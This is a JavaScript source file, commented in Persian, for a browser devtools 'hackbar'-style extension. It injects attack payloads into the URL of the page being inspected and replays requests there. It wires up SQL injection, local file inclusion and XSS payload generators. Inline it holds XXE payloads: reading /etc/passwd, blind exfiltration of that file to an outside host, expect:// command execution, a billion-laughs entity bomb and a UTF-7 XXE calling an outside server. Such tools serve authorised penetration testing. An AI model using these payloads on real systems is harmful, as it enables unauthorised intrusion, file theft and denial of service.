let urlField = $('#url_field');
let postDataField = $('#post_data_field');
let refererField = $('#referer_field');
let userAgentField = $('#user_agent_field');
let cookieField = $('#cookie_field');
let headerField = $('[name="header_field"]');

let loadUrlBtn = $('#load_url');
let manualUrlBtn = $('#manual_url');
let splitUrlBtn = $('#split_url');
let executeBtn = $('#execute');

let enablePostBtn = $('#enable_post_btn');
let enableRefererBtn = $('#enable_referer_btn');
let enableUserAgentBtn = $('#enable_user_agent_btn');
let enableCookieBtn = $('#enable_cookie_btn');
let addHeader = $('#add_header');
let clearAllBtn = $('#clear_all');
let resetPayloadBtn = $('#reset_payload');

const menu_btn_array = ['wordpress-users', 'wp-config-check', 'wp-version-detect', 'wp-dir-listing', 'md5', 'sha1', 'sha256', 'sha3', 'sha224', 'sha384', 'sha512', 'rot13', 'base64_encode', 'base64_decode', 'url_encode', 'url_decode', 'hex_encode', 'hex_decode', 'sql_error_based', 'sql_union_based', 'sql_boolean_based', 'sql_time_based', 'sql_out_of_band', 'xss_string_from_charcode', 'xss_html_characters', 'xss_alert', 'xss_image', 'xss_dom_based', 'xss_svg', 'xss_css', 'xss_iframe', 'xss_polyglot', 'xss_event_handler', 'xss_angular', 'xss_jsfuck', 'xss_stored', 'xss_reflected', 'xss_mutation', 'xss_csp_bypass', 'lfi_basic_payload', 'lfi_null_byte', 'lfi_passwd_file', 'lfi_directory_traversal', 'lfi_php_wrapper', 'xxe_lfi', 'xxe_blind', 'xxe_load_resource', 'xxe_ssrf', 'xxe_rce', 'xxe_xee_local', 'xxe_xee_remove', 'xxe_utf7', 'exposure_database'];

let currentTabId = browser.devtools != undefined ? browser.devtools.inspectedWindow.tabId : null;
let currentFocusField = urlField;

let currentHeaders = [];

// متغیر جدید برای ذخیره URL فعلی مرورگر
let currentBrowserUrl = "";

// اضافه کردن تابع جدید برای دریافت URL فعلی که در تمام بخش‌های LFI از آن استفاده می‌شود
function getCurrentBrowserUrl(callback) {
    // مستقیماً از background script درخواست URL را ارسال می‌کنیم
    browser.runtime.sendMessage({
        action: 'get_current_url'
    }, function(response) {
        // اگر URL از طریق background script دریافت شد
        if (response && response.url) {
            currentBrowserUrl = response.url;
            callback(response.url);
        } else {
            // روش دوم: استفاده از devtools.inspectedWindow
            if (browser && browser.devtools && browser.devtools.inspectedWindow && browser.devtools.inspectedWindow.eval) {
                browser.devtools.inspectedWindow.eval("window.location.href", function(result, isException) {
                    if (!isException && result) {
                        currentBrowserUrl = result;
                        callback(result);
                    } else {
                        callback(null);
                    }
                });
            } else {
                callback(null);
            }
        }
    });
}

function onFocusListener() {
    currentFocusField = $(this);
}

/* Other function */
function jsonValid(text) {
    try {
        return JSON.parse(text);
    } catch (e) {
        return false;
    }
}

function getFieldFormData(dataString) {
    let fields = Array();
    let f_split = dataString.trim().split('&');
    for (let i in f_split) {
        let f = f_split[i].match(/(^.*?)=(.*)/);
        if (f.length === 3) {
            let item = {};
            item['name'] = f[1];
            item['value'] = unescape(f[2]);
            fields.push(item);
        }
    }
    return fields;
}

function urlEncode(inputStr) {
    return encodeURIComponent(inputStr);
}

function jsonBeautify(inputStr) {
    let jsonString = jsonValid(inputStr);
    if (jsonString) {
        return JSON.stringify(jsonString, null, 4);
    }
    return false;
}

function upperCaseString(inputStr) {
    return inputStr.toUpperCase();
}

function lowerCaseString(inputStr) {
    return inputStr.toLowerCase();
}

// toggle element
function toggleElement(elementBtn, elementBlock) {
    if (elementBtn.prop('checked')) {
        elementBlock.show();
    } else {
        elementBlock.hide();
    }
}

// تابع جدید برای دریافت مستقیم URL از مرورگر
function loadUrl() {
    // مستقیماً از background script درخواست URL را ارسال می‌کنیم
    // این روش مطمئن‌ترین روش برای افزونه‌های Firefox و Chrome است
    browser.runtime.sendMessage({
        action: 'get_current_url'
    }, function(response) {
        // اگر URL از طریق background script دریافت شد
        if (response && response.url) {
            urlField.val(response.url);
            currentBrowserUrl = response.url;
            
            // حالا اطلاعات بیشتر را درخواست کنیم
            loadAdditionalInfo();
        } else {
            // روش دوم: تلاش با استفاده از API tabs
            tryUsingTabsAPI();
        }
    });
    
    // روش دوم: استفاده از tabs.query برای یافتن تب فعال
    function tryUsingTabsAPI() {
        if (browser && browser.tabs) {
            browser.tabs.query({active: true, currentWindow: true}, function(tabs) {
                if (tabs && tabs.length > 0 && tabs[0].url) {
                    urlField.val(tabs[0].url);
                    currentBrowserUrl = tabs[0].url;
                    
                    // حالا اطلاعات بیشتر را درخواست کنیم
                    loadAdditionalInfo();
                } else if (browser && browser.devtools && browser.devtools.inspectedWindow) {
                    // روش سوم: استفاده از devtools API
                    tryUsingDevtoolsAPI();
                } else {
                    // آخرین راه حل: از کاربر بخواهیم URL را وارد کند
                    promptUserForUrl();
                }
            });
        } else if (browser && browser.devtools && browser.devtools.inspectedWindow) {
            // روش سوم: استفاده از devtools API
            tryUsingDevtoolsAPI();
        } else {
            // آخرین راه حل: از کاربر بخواهیم URL را وارد کند
            promptUserForUrl();
        }
    }
    
    // روش سوم: استفاده از devtools.inspectedWindow
    function tryUsingDevtoolsAPI() {
        if (browser.devtools.inspectedWindow.eval) {
            // اجرای کد JavaScript در زمینه تب بازرسی شده برای دریافت URL
            browser.devtools.inspectedWindow.eval("window.location.href", function(result, isException) {
                if (!isException && result) {
                    urlField.val(result);
                    currentBrowserUrl = result;
                    
                    // حالا اطلاعات بیشتر را درخواست کنیم
                    loadAdditionalInfo();
                } else {
                    // آخرین راه حل: از کاربر بخواهیم URL را وارد کند
                    promptUserForUrl();
                }
            });
        } else {
            // آخرین راه حل: از کاربر بخواهیم URL را وارد کند
            promptUserForUrl();
        }
    }
    
    // آخرین راه حل: از کاربر بخواهیم URL را وارد کند
    function promptUserForUrl() {
        $('#myModal .modal-header').text('Website address not received. Please enter the address');
        $('#myModal input').val("");
        $('#myModal').modal();
        $('#myModal button').unbind('click').bind('click', function() {
            const entered_url = $('#myModal input').val();
            if (entered_url) {
                urlField.val(entered_url);
                currentBrowserUrl = entered_url;
            }
            $('#myModal').modal('hide');
        });
    }
    
    // درخواست اطلاعات بیشتر مثل هدرها و داده‌های POST
    function loadAdditionalInfo() {
    browser.runtime.sendMessage({
        tabId: currentTabId,
        action: 'load_url',
        data: null
    }, function (message) {
            if (message) {
        if ('data' in message && message.data && postDataField.val() === "") {
            postDataField.val(message.data);
        }
                
        if ('headers' in message && message.headers) {
            const h = message.headers;
            if (h.referer) {
                refererField.val(h.referer);
                        enableRefererBtn.prop('checked', true);
                        toggleElement(enableRefererBtn, refererField.closest('.block'));
            }
            if (h.cookie) {
                cookieField.val(h.cookie);
                        enableCookieBtn.prop('checked', true);
                        toggleElement(enableCookieBtn, cookieField.closest('.block'));
            }
                    if (h.custom && Object.keys(h.custom).length > 0) {
                currentHeaders = h.custom;
                addCurrentHeaders(h.custom);
                    }
            }
        }
    });
    }
}

function addCurrentHeaders(customCurrentHeaders) {
    for (let index in customCurrentHeaders) {
        let headersAlreadyLoaded = $('[name="header_field"]');
        let alreadyExist = false;
        let value = index + ": " + customCurrentHeaders[index];

        for (let i = 0; i < headersAlreadyLoaded.length; i++) {
            if (headersAlreadyLoaded[i].value.toLowerCase().trim() === value.toLowerCase().trim())
                alreadyExist = true;
        }

        if (alreadyExist)
            continue;

        let header = headerField.closest('.block');
        header = header.get(0).cloneNode(true);
        $(header).removeClass('block');
        $(header).find('input').removeAttr('disabled');
        $(header).find('input').val(index + ": " + customCurrentHeaders[index]);
        headerField.closest('.block').after(header);
    }
}

function splitUrl() {
    let uri = currentFocusField.val();
    uri = uri.replace(new RegExp(/&/g), "\n&");
    uri = uri.replace(new RegExp(/\?/g), "\n?");
    currentFocusField.val(uri);
    return true;
}

function exec(cmd) {
    return browser.devtools.inspectedWindow.eval(cmd);
}

function execute() {
    let Headers = {
        referer: null,
        user_agent: null,
        cookie: null,
        custom: null
    }

    let post_data = null;
    let method = 'GET';

    if (enableRefererBtn.prop('checked')) {
        Headers.referer = refererField.val();
    }
    if (enableUserAgentBtn.prop('checked')) {
        Headers.user_agent = userAgentField.val();
    }
    if (enableCookieBtn.prop('checked')) {
        Headers.cookie = cookieField.val();
    }
    if (enablePostBtn.prop('checked')) {
        method = 'POST';
        post_data = getFieldFormData(postDataField.val());
    }
    if ($('[name="header_field"]').not(':disabled').length > 0) {
        let customHeaders = $('[name="header_field"]').not(':disabled');
        Headers.custom = [];

        for (let i = 0; i < customHeaders.length; i++) {

            let header = customHeaders[i].value;

            if (!header.match(/[a-zA-Z\-]*: .*/))
                continue;

            [key, value] = header.split(': ', 2);
            Headers.custom[key.trim()] = value.trim();
        }
    }

    let url = urlField.val();
    url = url.replace(new RegExp(/\n|\r/g), '').trim();
    if (!(new RegExp(/^(http:\/\/|https:\/\/|view-source:)/gi)).test(url)) {
        url = 'http://' + url;
    }
    if (!url) {
        return;
    }
    if (method === 'GET') {
        let uri = new URL(url);

        let code = 'const url = "' + encodeURIComponent(url) + '";';
        code += 'window.location.href = decodeURIComponent(url);';

        if (uri.hash !== '')
            code += 'window.location.reload(true);';

        browser.devtools.inspectedWindow.eval(code, function (result, isException) {
            setTimeout(() => {
                currentFocusField.focus()
            }, 100);
        });
    } else {
        let code = 'var post_data = "' + encodeURIComponent(JSON.stringify(post_data)) + '"; var url = "' + encodeURIComponent(url) + '";';
        code += 'var fields = JSON.parse(decodeURIComponent(post_data));';
        code += 'const form = document.createElement("form");';
        code += 'form.setAttribute("method", "post");';
        code += 'form.setAttribute("action", decodeURIComponent(url));';
        code += 'fields.forEach(function(f) { var input = document.createElement("input"); input.setAttribute("type", "hidden"); input.setAttribute("name", f[\'name\']); input.setAttribute("value", f[\'value\']); form.appendChild(input); });';
        code += 'document.body.appendChild(form);'
        code += 'form.submit();';
        exec(code)
    }

    browser.runtime.sendMessage({
        tabId: currentTabId,
        action: 'send_requests',
        data: {headers: Headers}
    });
}

function getSelectedText(callbackFunction) {
    const selectionStart = currentFocusField.prop('selectionStart');
    const selectionEnd = currentFocusField.prop('selectionEnd');
    if (selectionEnd - selectionStart < 1) {
        $('#myModal').modal();
        $('#myModal input').val("");
        $('#myModal button').bind('click', () => {
            const selected_text = $('#myModal input').val();
            callbackFunction(selected_text);
            $('#myModal').modal('hide');
        });
    } else {
        callbackFunction(currentFocusField.val().substr(selectionStart, selectionEnd - selectionStart));
    }
}

function setSelectedText(str) {
    let selectionStart = currentFocusField.prop('selectionStart');
    let selectionEnd = currentFocusField.prop('selectionEnd');
    let pre = currentFocusField.val().substr(0, selectionStart);
    let post = currentFocusField.val().substr(selectionEnd, currentFocusField.val().length);
    currentFocusField.val(pre + str + post);
    currentFocusField[0].setSelectionRange(selectionStart, selectionEnd + str.length)
}

// تابع برای افزودن متن به محتوای فعلی فیلد
function appendToTextField(str) {
    let currentText = currentFocusField.val();
    
    // اگر فیلد خالی است و URL مرورگر در دسترس است، ابتدا URL را در فیلد قرار می‌دهیم
    if (!currentText && currentBrowserUrl) {
        currentText = currentBrowserUrl;
        currentFocusField.val(currentText);
    }
    
    // اگر متن فعلی با کاراکتر خط جدید پایان نیافته باشد، یک خط جدید اضافه کن
    if (currentText && currentText.length > 0 && !currentText.endsWith('\n')) {
        currentText += '\n';
    }
    
    currentFocusField.val(currentText + str);
    // قرار دادن نشانگر در انتهای متن
    currentFocusField.focus();
    const textLength = currentFocusField.val().length;
    currentFocusField[0].setSelectionRange(textLength, textLength);
}

// تابع برای نمایش اعلان کوچک به کاربر
function showNotification(message, type = 'info') {
    const notificationDiv = $('<div class="notification ' + type + '">' + message + '</div>');
    $('body').append(notificationDiv);
    
    // نمایش با انیمیشن
    setTimeout(() => {
        notificationDiv.addClass('show');
        
        // حذف پس از چند ثانیه
        setTimeout(() => {
            notificationDiv.removeClass('show');
            setTimeout(() => {
                notificationDiv.remove();
            }, 500);
        }, 2000);
    }, 100);
}

// تابع جدید برای پاک‌سازی فیلدها قبل از اعمال پیلود جدید
function clearInputFields() {
    // Clear URL field
    urlField.val('');
    
    // Clear post data
    postDataField.val('');
    
    // Clear headers
    refererField.val('');
    userAgentField.val('');
    cookieField.val('');
    
    // Remove all custom headers except the first one
    $('[name="header_field"]').not(':disabled').closest('.form-group').not('.block').remove();
    
    // Reset current headers array
    currentHeaders = [];
    
    // Uncheck all checkboxes
    enablePostBtn.prop('checked', false);
    enableRefererBtn.prop('checked', false);
    enableUserAgentBtn.prop('checked', false);
    enableCookieBtn.prop('checked', false);
    
    // Hide all optional blocks
    toggleElement(enablePostBtn, postDataField.closest('.block'));
    toggleElement(enableRefererBtn, refererField.closest('.block'));
    toggleElement(enableUserAgentBtn, userAgentField.closest('.block'));
    toggleElement(enableCookieBtn, cookieField.closest('.block'));
    
    // Focus on URL field
    urlField.focus();
    
    // Clear console
    console.clear();
    
    // Show notification
    showNotification('Fields cleared successfully', 'success');
}

// تابع جدید برای اجرای خودکار LFI
function applyLfiAndExecute(payloadGenerator) {
    // پاک‌سازی فیلدها قبل از اضافه کردن پیلود جدید
    clearInputFields();
    
    // دریافت URL صفحه فعلی از مرورگر
    browser.runtime.sendMessage({
        action: 'get_current_url'
    }, function(response) {
        let targetSiteUrl;
        
        if (response && response.url) {
            targetSiteUrl = response.url;
            currentBrowserUrl = response.url;
            
            // تولید پی‌لود LFI با استفاده از تابع تولیدکننده ارسالی
            const payload = payloadGenerator(targetSiteUrl);
            
            // قرار دادن پی‌لود در فیلد ورودی
            urlField.val(payload);
            
            // قرار دادن فوکوس روی فیلد URL برای بررسی احتمالی توسط کاربر
            urlField.focus();
            
            // هشدار به کاربر که پی‌لود آماده است (اختیاری)
            console.log("LFI payload ready. Click Execute to run.");
            
        } else {
            // اگر نتوانستیم URL را دریافت کنیم، از کاربر بخواهیم آدرس را وارد کند
            $('#myModal .modal-header').text('آدرس سایت دریافت نشد. لطفا آدرس را وارد کنید');
            $('#myModal input').val("");
            $('#myModal').modal();
            $('#myModal button').unbind('click').bind('click', function() {
                const entered_url = $('#myModal input').val();
                if (entered_url) {
                    urlField.val(entered_url);
                    currentBrowserUrl = entered_url;
                    
                    // تولید پی‌لود LFI
                    const payload = payloadGenerator(entered_url);
                    
                    // قرار دادن پی‌لود در فیلد ورودی
                    urlField.val(payload);
                    
                    // قرار دادن فوکوس روی فیلد URL
                    urlField.focus();
                }
                $('#myModal').modal('hide');
            });
        }
    });
}

// به‌روزرسانی تابع onclickMenu برای پشتیبانی از گزینه‌های LFI
function onclickMenu() {
    menu_btn_array.forEach((menuID) => {
        document.getElementById(menuID).addEventListener("click", function () {
            let id = this.id;
            
            // Clear input fields before any new payload is generated
            clearInputFields();
            
            // Get the current URL if available
            getCurrentBrowserUrl(function(url) {
                if (url) {
                    urlField.val(url);
                }
                
                switch (id) {
        case 'wordpress-users':
            getSelectedText(function (txt) {
                if (txt) {
                    setSelectedText(txt + "/wp-json/wp/v2/users");
                }
            });
            break;
                    case 'wp-config-check':
                        wpConfigLeakCheck();
                        break;
                    case 'wp-version-detect':
                        wpVersionDetect();
                        break;
                    case 'wp-dir-listing':
                        wpDirectoryListingDetection();
                        break;
        case 'md5':
            getSelectedText(function (txt) {
                if (txt) {
                    setSelectedText(Encrypt.md5(txt));
                }
            });
            break;
        case 'sha3':
            getSelectedText(function (txt) {
                if (txt) {
                    setSelectedText(CryptoJS.SHA3(txt).toString());
                }
            });
            break;
        case 'sha224':
            getSelectedText(function (txt) {
                if (txt) {
                    setSelectedText(CryptoJS.SHA224(txt).toString());
                }
            });
            break;
        case 'sha384':
            getSelectedText(function (txt) {
                if (txt) {
                    setSelectedText(CryptoJS.SHA384(txt).toString());
                }
            });
            break;
        case 'sha512':
            getSelectedText(function (txt) {
                if (txt) {
                    setSelectedText(CryptoJS.SHA512(txt).toString());
                }
            });
            break;
        case 'sha1':
            getSelectedText(function (txt) {
                if (txt) {
                    setSelectedText(Encrypt.sha1(txt));
                }
            });
            break;
        case 'sha256':
            getSelectedText(function (txt) {
                if (txt) {
                    setSelectedText(Encrypt.sha2(txt));
                }
            });
            break;
        case 'rot13':
            getSelectedText(function (txt) {
                if (txt) {
                    setSelectedText(Encrypt.rot13(txt));
                }
            });
            break;
        case 'base64_encode':
            getSelectedText(function (txt) {
                if (txt) {
                    setSelectedText(Encrypt.base64Encode(txt));
                }
            });
            break;
        case 'base64_decode':
            getSelectedText(function (txt) {
                if (txt) {
                    setSelectedText(Encrypt.base64Decode(txt));
                }
            });
            break;
        case 'url_encode':
            getSelectedText(function (txt) {
                if (txt) {
                    setSelectedText(urlEncode(txt));
                }
            });
            break;
        case 'url_decode':
            getSelectedText(function (txt) {
                if (txt) {
                    setSelectedText(unescape(txt));
                }
            });
            break;
        case 'hex_encode':
            getSelectedText(function (txt) {
                if (txt) {
                    setSelectedText(Encrypt.strToHex(txt));
                }
            });
            break;
        case 'hex_decode':
            getSelectedText(function (txt) {
                if (txt) {
                    setSelectedText(Encrypt.hexToStr(txt));
                }
            });
            break;
        case 'sql_error_based':
            if (url) {
                urlField.val(SQL.createErrorBasedPayload(url));
            }
            break;
        case 'sql_union_based':
            if (url) {
                urlField.val(SQL.createUnionBasedPayload(url));
            }
            break;
        case 'sql_boolean_based':
            if (url) {
                urlField.val(SQL.createBooleanBasedPayload(url));
            }
            break;
        case 'sql_time_based':
            if (url) {
                urlField.val(SQL.createTimeBasedPayload(url));
            }
            break;
        case 'sql_out_of_band':
            if (url) {
                urlField.val(SQL.createOutOfBandPayload(url));
            }
            break;
        case 'lfi_basic_payload':
            if (url) {
                // Don't duplicate URL - replace it with payload
                urlField.val(LFI.createBasicPayload(url));
            }
            break;
        case 'lfi_null_byte':
            if (url) {
                // Don't duplicate URL - replace it with payload
                urlField.val(LFI.createNullBytePayload(url));
            }
            break;
        case 'lfi_passwd_file':
            if (url) {
                // Don't duplicate URL - replace it with payload
                urlField.val(LFI.createPasswdFilePayload(url));
            }
            break;
        case 'lfi_directory_traversal':
            if (url) {
                // Don't duplicate URL - replace it with payload
                urlField.val(LFI.createDirectoryTraversalPayload(url));
            }
            break;
        case 'lfi_php_wrapper':
            if (url) {
                // Don't duplicate URL - replace it with payload
                urlField.val(LFI.createPHPWrapperPayload(url));
            }
            break;
        case 'xss_string_from_charcode':
            if (url) {
                // Create XSS payload and integrate with the current URL
                const xssPayload = XSS.selectionToChar('stringFromCharCode', 'alert(1)');
                const urlWithPayload = integrateXssPayloadWithUrl(url, xssPayload);
                urlField.val(urlWithPayload);
            }
            break;
        case 'xss_html_characters':
            if (url) {
                // Create XSS payload and integrate with the current URL
                const xssPayload = XSS.selectionToChar('htmlChar', 'alert(1)');
                const urlWithPayload = integrateXssPayloadWithUrl(url, xssPayload);
                urlField.val(urlWithPayload);
            }
            break;
        case 'xss_alert':
            if (url) {
                // Create XSS payload and integrate with the current URL
                const xssPayload = XSS.createAlertXSS("1");
                const urlWithPayload = integrateXssPayloadWithUrl(url, xssPayload);
                urlField.val(urlWithPayload);
            }
            break;
        case 'xss_image':
            if (url) {
                // Create XSS payload and integrate with the current URL
                const xssPayload = XSS.createImageXSS("alert(1)");
                const urlWithPayload = integrateXssPayloadWithUrl(url, xssPayload);
                urlField.val(urlWithPayload);
            }
            break;
        case 'xss_dom_based':
            if (url) {
                // Create XSS payload and integrate with the current URL
                const xssPayload = XSS.createDomBasedXSS("alert(1)");
                const urlWithPayload = integrateXssPayloadWithUrl(url, xssPayload);
                urlField.val(urlWithPayload);
            }
            break;
        case 'xss_svg':
            if (url) {
                // Create XSS payload and integrate with the current URL
                const xssPayload = XSS.createSvgXSS();
                const urlWithPayload = integrateXssPayloadWithUrl(url, xssPayload);
                urlField.val(urlWithPayload);
            }
            break;
        case 'xss_css':
            if (url) {
                // Create XSS payload and integrate with the current URL
                const xssPayload = XSS.createCssXSS();
                const urlWithPayload = integrateXssPayloadWithUrl(url, xssPayload);
                urlField.val(urlWithPayload);
            }
            break;
        case 'xss_iframe':
            if (url) {
                // Create XSS payload and integrate with the current URL
                const xssPayload = XSS.createIframeXSS();
                const urlWithPayload = integrateXssPayloadWithUrl(url, xssPayload);
                urlField.val(urlWithPayload);
            }
            break;
        case 'xss_polyglot':
            if (url) {
                // Create XSS payload and integrate with the current URL
                const xssPayload = XSS.createPolyglotXSS();
                const urlWithPayload = integrateXssPayloadWithUrl(url, xssPayload);
                urlField.val(urlWithPayload);
            }
            break;
        case 'xss_event_handler':
            if (url) {
                // Create XSS payload and integrate with the current URL
                const xssPayload = XSS.createEventHandlerXSS();
                const urlWithPayload = integrateXssPayloadWithUrl(url, xssPayload);
                urlField.val(urlWithPayload);
            }
            break;
        case 'xss_angular':
            if (url) {
                // Create XSS payload and integrate with the current URL
                const xssPayload = XSS.createAngularXSS();
                const urlWithPayload = integrateXssPayloadWithUrl(url, xssPayload);
                urlField.val(urlWithPayload);
            }
            break;
        case 'xss_jsfuck':
            if (url) {
                // Create XSS payload and integrate with the current URL
                const xssPayload = XSS.createJSFuckXSS();
                const urlWithPayload = integrateXssPayloadWithUrl(url, xssPayload);
                urlField.val(urlWithPayload);
            }
            break;
        case 'xss_stored':
            if (url) {
                // Create XSS payload and integrate with the current URL
                const xssPayload = XSS.createStoredXSS("alert(document.cookie)");
                const urlWithPayload = integrateXssPayloadWithUrl(url, xssPayload);
                urlField.val(urlWithPayload);
            }
            break;
        case 'xss_reflected':
            if (url) {
                // Create XSS payload and integrate with the current URL
                const xssPayload = XSS.createReflectedXSS("alert(document.domain)");
                const urlWithPayload = integrateXssPayloadWithUrl(url, xssPayload);
                urlField.val(urlWithPayload);
            }
            break;
        case 'xss_mutation':
            if (url) {
                // Create XSS payload and integrate with the current URL
                const xssPayload = XSS.createMutationXSS("alert(1)");
                const urlWithPayload = integrateXssPayloadWithUrl(url, xssPayload);
                urlField.val(urlWithPayload);
            }
            break;
        case 'xss_csp_bypass':
            if (url) {
                // Create XSS payload and integrate with the current URL
                const xssPayload = XSS.createCSPBypassXSS();
                const urlWithPayload = integrateXssPayloadWithUrl(url, xssPayload);
                urlField.val(urlWithPayload);
            }
            break;
        case 'xxe_lfi':
            var xxeStr = '<?xml version="1.0"?>' +
                '<!DOCTYPE foo [  ' +
                '<!ELEMENT foo (#ANY)>' +
                '<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>';
            this.setSelectedText(xxeStr);
            break;
        case 'xxe_blind':
            var xxeStr = '<?xml version="1.0"?>' +
                '<!DOCTYPE foo [' +
                '<!ELEMENT foo (#ANY)>' +
                '<!ENTITY % xxe SYSTEM "file:///etc/passwd">' +
                '<!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]><foo>&blind;</foo>';
            this.setSelectedText(xxeStr);
            break;
        case 'xxe_load_resource':
            var xxeStr = '<?xml version="1.0"?>' +
                '<!DOCTYPE foo [' +
                '<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>' +
                '<foo><result>&ac;</result></foo>';
            this.setSelectedText(xxeStr);
            break;
        case 'xxe_ssrf':
            var xxeStr = '<?xml version="1.0"?>' +
                '<!DOCTYPE foo [  ' +
                '<!ELEMENT foo (#ANY)>' +
                '<!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>';
            this.setSelectedText(xxeStr);
            break;
        case 'xxe_rce':
            var xxeStr = '[ run "uname" command]' +
                '<?xml version="1.0" encoding="ISO-8859-1"?>' +
                '<!DOCTYPE foo [ <!ELEMENT foo ANY >' +
                '<!ENTITY xxe SYSTEM "expect://uname" >]>' +
                '<creds>' +
                '    <user>&xxe;</user>' +
                '</creds>';
            this.setSelectedText(xxeStr);
            break;
        case 'xxe_xee_local':
            var xxeStr = '<?xml version="1.0"?>' +
                '<!DOCTYPE lolz [' +
                '<!ENTITY lol "lol">' +
                '<!ELEMENT lolz (#PCDATA)>' +
                '<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">' +
                '<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">' +
                '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">' +
                '<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">' +
                '<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">' +
                '<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">' +
                '<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">' +
                '<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">' +
                '<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">' +
                ']>' +
                '<lolz>&lol9;</lolz>';
            this.setSelectedText(xxeStr);
            break;
        case 'xxe_xee_remove':
            var xxeStr = '<?xml version="1.0"?>' +
                '<!DOCTYPE lolz [' +
                '<!ENTITY test SYSTEM "https://example.com/entity1.xml">]>' +
                '<lolz><lol>3..2..1...&test<lol></lolz>';
            this.setSelectedText(xxeStr);
            break;
        case 'xxe_utf7':
            var xxeStr = '<?xml version="1.0" encoding="UTF-7"?>' +
                '+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4' +
                '+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+' +
                '+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4';
            this.setSelectedText(xxeStr);
            break;
        case 'exposure_database':
            checkDatabaseExposure();
            break;
    }
    currentFocusField.focus();
            });
        });
    });
}

//on focus listener field
urlField.bind('click', onFocusListener, false);
postDataField.bind('click', onFocusListener, false);
refererField.bind('click', onFocusListener, false);
userAgentField.bind('click', onFocusListener, false);
cookieField.bind('click', onFocusListener, false);

//Events
loadUrlBtn.bind('click', function () {
    loadUrl();
});
manualUrlBtn.bind('click', function () {
    manualUrlInput();
});
splitUrlBtn.bind('click', function () {
    splitUrl();
});
executeBtn.bind('click', function () {
    execute();
});
clearAllBtn.bind('click', function () {
    clearInputFields();
});
resetPayloadBtn.bind('click', function () {
    resetPayload();
});

enablePostBtn.click(function () {
    toggleElement($(this), postDataField.closest('.block'));
});
enableRefererBtn.click(function () {
    toggleElement($(this), refererField.closest('.block'));
});
enableUserAgentBtn.click(function () {
    toggleElement($(this), userAgentField.closest('.block'));
});
enableCookieBtn.click(function () {
    toggleElement($(this), cookieField.closest('.block'));
});
addHeader.click(function () {
    let header = headerField.closest('.block');
    header = header.get(0).cloneNode(true);
    $(header).removeClass('block');
    $(header).find('input').removeAttr('disabled');
    headerField.closest('.block').after(header);
});

//Add event listener
menu_btn_array.forEach(function (elementID) {
    $('#' + elementID).bind('click', function () {
        onclickMenu(this);
    });
});

// Keyboard listener
$(document).on('keypress', function (event) {
    if ('key' in event && event.ctrlKey && event.charCode === 13) {
        execute();
    }
});

// تابع برای ورود دستی URL
function manualUrlInput() {
    $('#myModal .modal-header').text('لطفا آدرس سایت مورد نظر را وارد کنید');
    $('#myModal input').val("");
    $('#myModal').modal();
    $('#myModal button').unbind('click').bind('click', () => {
        const entered_url = $('#myModal input').val();
        if (entered_url) {
            urlField.val(entered_url);
            // به روز رسانی URL فعلی مرورگر
            currentBrowserUrl = entered_url;
        }
        $('#myModal').modal('hide');
    });
}

// بهبود تابع استخراج URL پایه
function extractBaseUrl(url) {
    // الگوی regex برای یافتن بخش پایه URL
    const match = url.match(/^(https?:\/\/[^\/]+)(\/[^\/]*)*\/?/);
    
    if (match && match[0]) {
        // اطمینان از اینکه URL با / تمام می‌شود
        return match[0].endsWith('/') ? match[0] : match[0] + '/';
    }
    
    // اگر نتوانستیم URL را تجزیه کنیم، URL اصلی را با / در انتها برمی‌گردانیم
    return url.endsWith('/') ? url : url + '/';
}

// تابع جدید برای ریست کامل پیلود و حافظه
function resetPayload() {
    // پاک‌سازی کامل فیلدها
    clearInputFields();
    
    // ریست کردن متغیرهای حافظه
    currentHeaders = [];
    currentBrowserUrl = "";
    
    // پاک کردن تمام هدرهای سفارشی
    $('[name="header_field"]').not(':disabled').closest('.form-group').remove();
    
    // غیرفعال کردن تمام چک‌باکس‌ها
    enablePostBtn.prop('checked', false);
    enableRefererBtn.prop('checked', false);
    enableUserAgentBtn.prop('checked', false);
    enableCookieBtn.prop('checked', false);
    
    // مخفی کردن تمام بلاک‌های اختیاری
    toggleElement(enablePostBtn, postDataField.closest('.block'));
    toggleElement(enableRefererBtn, refererField.closest('.block'));
    toggleElement(enableUserAgentBtn, userAgentField.closest('.block'));
    toggleElement(enableCookieBtn, cookieField.closest('.block'));
    
    // پاک کردن کنسول
    console.clear();
    
    // نمایش اعلان
    showNotification('Payload and memory reset successfully', 'warning');
}

// Add new helper function for integrating XSS payloads with URLs
function integrateXssPayloadWithUrl(url, xssPayload) {
    try {
        // Parse the URL to understand its structure
        const urlObj = new URL(url);
        
        // Check if URL already has parameters
        if (urlObj.search) {
            // URL already has parameters, append XSS payload to an additional parameter
            return `${url}&xss=${encodeURIComponent(xssPayload)}`;
        } else {
            // URL has no parameters, add XSS payload as the first parameter
            return `${url}?xss=${encodeURIComponent(xssPayload)}`;
        }
    } catch (e) {
        // If URL parsing fails, just append the payload to be safe
        console.log("URL parsing failed, using simple concatenation", e);
        if (url.includes('?')) {
            return `${url}&xss=${encodeURIComponent(xssPayload)}`;
        } else {
            return `${url}?xss=${encodeURIComponent(xssPayload)}`;
        }
    }
}

